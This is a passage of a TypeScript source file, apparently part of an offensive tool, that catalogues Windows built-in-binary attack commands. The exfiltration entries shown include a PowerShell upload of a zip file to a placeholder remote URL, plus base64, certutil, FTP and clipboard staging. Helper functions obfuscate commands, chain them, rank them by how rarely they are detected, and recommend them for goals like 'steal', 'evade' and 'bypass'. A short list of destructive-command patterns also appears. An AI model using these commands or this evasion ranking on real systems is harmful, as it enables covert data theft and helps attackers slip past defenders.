        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.70,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Mavinject/"],
      },
    ],
  },

  /* ---------------------------------------------------------------- */
  /*  Exfiltration                                                     */
  /* ---------------------------------------------------------------- */
  {
    id: "exfiltration",
    name: "Exfiltration",
    description: "Techniques for data collection and covert exfiltration",
    commands: [
      {
        id: "powershell_upload",
        name: "PowerShell HTTP Upload",
        category: "exfiltration",
        description: "Upload a file to a remote server via PowerShell WebClient",
        binaryPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command: "powershell -c \"(New-Object Net.WebClient).UploadFile('http://example.com/upload','C:\\temp\\data.zip')\"",
        obfuscated: false,
        riskLevel: "high",
        detectionRate: 0.70,
        references: ["https://lolbas-project.github.io/lolbas/Scripts/PowerShell/"],
      },
      {
        id: "powershell_b64_file",
        name: "PowerShell Base64 File",
        category: "exfiltration",
        description: "Encode a file as base64 string for covert text-based exfiltration",
        binaryPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command: "powershell -c \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\temp\\data.zip')) | Out-File C:\\temp\\data.b64\"",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.45,
        references: ["https://lolbas-project.github.io/lolbas/Scripts/PowerShell/"],
      },
      {
        id: "clip_stdout",
        name: "Clip Stdout Capture",
        category: "exfiltration",
        description: "Pipe command output to clipboard for manual exfiltration",
        binaryPath: "C:\\Windows\\System32\\clip.exe",
        command: "dir /s C:\\Users\\%USERNAME%\\Documents | clip",
        obfuscated: false,
        riskLevel: "low",
        detectionRate: 0.10,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Clip/"],
      },
      {
        id: "ftp_script",
        name: "FTP Script Upload",
        category: "exfiltration",
        description: "Upload files using built-in FTP client with a command script",
        binaryPath: "C:\\Windows\\System32\\ftp.exe",
        command: "ftp -s:C:\\temp\\ftp_cmds.txt <ftp_server>",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.60,
        references: ["https://lolbas-project.github.io/lolbas/OsBinaries/Ftp/"],
      },
      {
        id: "certutil_upload_b64",
        name: "Certutil DNS Exfil",
        category: "exfiltration",
        description: "Exfiltrate data by encoding files and staging for retrieval",
        binaryPath: "C:\\Windows\\System32\\certutil.exe",
        command: "certutil -encode C:\\temp\\data.zip C:\\temp\\data.b64 && type C:\\temp\\data.b64",
        obfuscated: false,
        riskLevel: "medium",
        detectionRate: 0.55,
        references: ["https://lolbas-project.github.io/lolbas/Binaries/Certutil/"],
      },
    ],
  },
]

/* ------------------------------------------------------------------ */
/*  Utility Functions                                                  */
/* ------------------------------------------------------------------ */

export function getCommandById(id: string): LotLCommand | undefined {
  for (const category of LOTL_COMMANDS) {
    const command = category.commands.find((cmd) => cmd.id === id)
    if (command) return command
  }
  return undefined
}

export function getCommandsByCategory(categoryId: string): LotLCommand[] {
  const category = LOTL_COMMANDS.find((cat) => cat.id === categoryId)
  return category?.commands ?? []
}

export function getCommandsByRiskLevel(riskLevel: "low" | "medium" | "high"): LotLCommand[] {
  const commands: LotLCommand[] = []
  for (const category of LOTL_COMMANDS) {
    commands.push(...category.commands.filter((cmd) => cmd.riskLevel === riskLevel))
  }
  return commands
}

export function searchCommands(keyword: string): LotLCommand[] {
  const lowerKeyword = keyword.toLowerCase()
  const commands: LotLCommand[] = []
  for (const category of LOTL_COMMANDS) {
    for (const command of category.commands) {
      if (
        command.name.toLowerCase().includes(lowerKeyword) ||
        command.description.toLowerCase().includes(lowerKeyword) ||
        command.command.toLowerCase().includes(lowerKeyword) ||
        category.name.toLowerCase().includes(lowerKeyword)
      ) {
        commands.push(command)
      }
    }
  }
  return commands
}

export function getAllCommands(): LotLCommand[] {
  return LOTL_COMMANDS.flatMap((cat) => cat.commands)
}

export function obfuscateCommand(command: string): string {
  let obfuscated = command
  obfuscated = obfuscated.replace(/powershell/gi, "PoWeRsHeLL")
  obfuscated = obfuscated.replace(/cmd/gi, "CmD")
  obfuscated = obfuscated.replace(/net/gi, "NeT")
  obfuscated = obfuscated.replace(/C:\\/g, "C:\\\\")
  return obfuscated
}

export function generateCommandChain(commands: LotLCommand[]): string {
  return commands
    .map((cmd) => (cmd.obfuscated ? obfuscateCommand(cmd.command) : cmd.command))
    .join(" && ")
}

export function validateCommandSafety(command: string): { safe: boolean; issues: string[] } {
  const issues: string[] = []
  const destructivePatterns = [
    { pattern: /rm -rf/i, message: "File deletion detected" },
    { pattern: /format.*c:/i, message: "Disk formatting detected" },
    { pattern: /shutdown/i, message: "System shutdown detected" },
    { pattern: /restart/i, message: "System restart detected" },
    { pattern: /del \/f/i, message: "Force file deletion detected" },
  ]
  destructivePatterns.forEach(({ pattern, message }) => {
    if (pattern.test(command)) issues.push(message)
  })
  return { safe: issues.length === 0, issues }
}

export function getCommandEffectivenessScore(command: LotLCommand): {
  score: number
  factors: { detectionRate: number; obfuscation: number; riskLevel: number }
} {
  const detectionScore = 100 - command.detectionRate * 100
  const obfuscationScore = command.obfuscated ? 20 : 0
  const riskScore = command.riskLevel === "low" ? 20 : command.riskLevel === "medium" ? 40 : 60
  const score = (detectionScore + obfuscationScore + riskScore) / 3
  return {
    score,
    factors: {
      detectionRate: command.detectionRate,
      obfuscation: command.obfuscated ? 1 : 0,
      riskLevel: riskScore / 20,
    },
  }
}

export function recommendCommands(objective: string): LotLCommand[] {
  const lower = objective.toLowerCase()
  const recommendations: LotLCommand[] = []
  if (lower.includes("download") || lower.includes("file")) recommendations.push(...getCommandsByCategory("file_operations"))
  if (lower.includes("info") || lower.includes("system") || lower.includes("recon")) recommendations.push(...getCommandsByCategory("system_info"))
  if (lower.includes("network") || lower.includes("connection")) recommendations.push(...getCommandsByCategory("network_operations"))
  if (lower.includes("persist") || lower.includes("maintain")) recommendations.push(...getCommandsByCategory("persistence"))
  if (lower.includes("lateral") || lower.includes("move") || lower.includes("remote")) recommendations.push(...getCommandsByCategory("lateral_movement"))
  if (lower.includes("cred") || lower.includes("password") || lower.includes("hash")) recommendations.push(...getCommandsByCategory("credential_access"))
  if (lower.includes("evade") || lower.includes("bypass") || lower.includes("uac")) recommendations.push(...getCommandsByCategory("defense_evasion"))
  if (lower.includes("exec") || lower.includes("run") || lower.includes("launch")) recommendations.push(...getCommandsByCategory("execution"))
  if (lower.includes("exfil") || lower.includes("upload") || lower.includes("steal")) recommendations.push(...getCommandsByCategory("exfiltration"))
  if (lower.includes("discover") || lower.includes("enum") || lower.includes("domain")) recommendations.push(...getCommandsByCategory("discovery"))
  return recommendations
    .map((cmd) => ({ command: cmd, score: getCommandEffectivenessScore(cmd) }))
    .sort((a, b) => b.score.score - a.score.score)
    .slice(0, 5)
    .map((item) => item.command)
}
